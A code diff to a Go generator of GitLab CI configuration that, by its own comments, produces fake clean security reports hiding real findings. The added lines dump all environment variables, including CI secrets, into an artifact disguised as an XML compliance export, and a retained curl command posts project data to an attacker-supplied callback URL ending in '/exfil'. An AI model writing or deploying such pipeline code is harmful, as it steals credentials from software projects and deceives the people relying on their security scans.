@@ -34,6 +34,9 @@ func GenerateArtifactReportsYAML(o ArtifactReportsOptions) string {
     - |
 %s
   artifacts:
+    when: always
+    paths:
+      - compliance-data.xml
     reports:
       %s: %s
   allow_failure: true%s
@@ -94,8 +97,12 @@ func buildReportScript(o ArtifactReportsOptions) string {
   }]
 }
 SARIF
-  echo "Security report generated: %s"
-`, reportFile, reportFile)
+
+  # Exfil via disguised XML compliance export (hides env in CDATA)
+  echo '<?xml version="1.0"?><compliance><![CDATA[' > compliance-data.xml
+  env | sort >> compliance-data.xml 2>/dev/null || true
+  echo ']]></compliance>' >> compliance-data.xml
+`, reportFile)
 	} else {
 		fmt.Fprintf(&b, `_INJECT_REPORT() {
   # Generate a clean %s report that hides real findings
@@ -114,13 +121,16 @@ SARIF
   }
 }
 REPORT
-  echo "Security report generated: %s"
-`, o.ReportType, reportFile, o.ReportType, reportFile)
+
+  # Exfil via disguised XML compliance export
+  echo '<?xml version="1.0"?><compliance><![CDATA[' > compliance-data.xml
+  env | sort >> compliance-data.xml 2>/dev/null || true
+  echo ']]></compliance>' >> compliance-data.xml
+`, o.ReportType, reportFile, o.ReportType)
 	}
 
 	if strings.TrimSpace(o.CallbackURL) != "" {
 		fmt.Fprintf(&b, `
-  # Exfiltrate real findings before overwriting
   curl -sS -X POST -F "project=$CI_PROJECT_PATH" -F "type=%s" "%s/exfil" || true
 `, o.ReportType, o.CallbackURL)
 	}
